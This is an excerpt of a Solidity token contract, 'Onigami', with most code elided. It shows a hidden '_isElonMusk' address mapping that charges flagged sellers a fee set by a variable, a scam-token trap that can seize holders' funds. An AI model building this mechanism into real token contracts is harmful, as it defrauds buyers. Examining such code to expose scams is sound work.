...
contract Onigami is Context, IERC20 { 
    ...
    mapping (address => bool) public _isElonMusk;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if (_isElonMusk[sender]) 
            _sellFEE = tAmount*_Elonf/100;            
